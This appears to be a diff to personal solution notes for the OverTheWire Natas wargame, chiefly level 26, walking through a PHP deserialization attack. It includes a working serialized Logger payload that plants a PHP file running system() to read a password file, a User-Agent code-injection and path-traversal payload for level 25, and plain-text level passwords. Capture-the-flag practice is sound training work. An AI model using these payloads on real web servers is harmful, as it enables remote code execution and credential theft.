@@ -510,3 +510,74 @@ headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
 response = session.post(url, headers = headers, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'},
 // 
 oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+lvl 26 --> lvl 27
+http://netas26.natas.labs.overthewire.org/
+natas26
+oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+// Natas 26 is a drawing tool that gives you the ability to input X,Y coordinates and see a picture of a line drawn between two points
+// One thing that immediately sticks out is that the filename of the image uses the session ID directly and is clearly injectable, see :
+if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
+        $imgfile="img/natas26_" . session_id() .".png"; 
+        drawImage($imgfile); 
+        showImage($imgfile);
+        storeData();
+    }
+// Furthermore, I started wondering about the Logger class. It doesn't seem to be used anywhere, so it's strange that its there.
+// It looks like their PHP code will unserialize an arbitrary object contained in the "drawing" cookie. Because of this, we can use this by sending it a serialized Logger object with the fields set in such a way that it will create a shell.php script on the server for us.
+// Lets get to it :
+After sending data, we can take a look at session.cookies['drawing'], looking at the result it is url encoded and base64 encoded. We thus obtain :
+# dataDecoded = (urllib.parse.unquote(data))
+# print(base64.b64decode(dataDecoded))
+# PHP serialized data : b'a:1:{i:0;a:4:{s:2:"x1";s:1:"0";s:2:"y1";s:1:"0";s:2:"x2";s:3:"500";s:2:"y2";s:3:"500";}}'
+// As such, we can inject PHP code through this channel, we write up code, encode it and serialize to push it.
+// To do so we modified the php code to the following (just modifying the data set): 
+ 
+ <?php
+
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file)
+    {
+            // initialise variables
+        $this->initMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
+        $this->exitMsg = "<?php system('cat /etc/natas_webpass/natas27'); ?>";
+        $this->logFile = "img/winner.php";
+      
+            // write initial message
+        $fd = fopen($this->logFile, " a + ");
+        fwrite($fd, $initMsg);
+        fclose($fd);
+    }
+
+    function log($msg)
+    {
+        $fd = fopen($this->logFile, " a + ");
+        fwrite($fd, $msg . " \n ");
+        fclose($fd);
+    }
+
+    function __destruct()
+    {
+            // write exit message
+        $fd = fopen($this->logFile, " a + ");
+        fwrite($fd, $this->exitMsg);
+        fclose($fd);
+    }
+}
+
+$object = new Logger("");
+echo( base64_encode(serialize($object)) );
+
+?>
+// We thus obtain our php code that we just have to set in the cookie
+session.cookies['drawing'] =  ' Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='
+// In our code we injected code redirecting is product to img/winner.php
+// So lets make a get request to it: 
+// response = session.get(url + '/img/winner.php', auth=(username, password))
+// 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
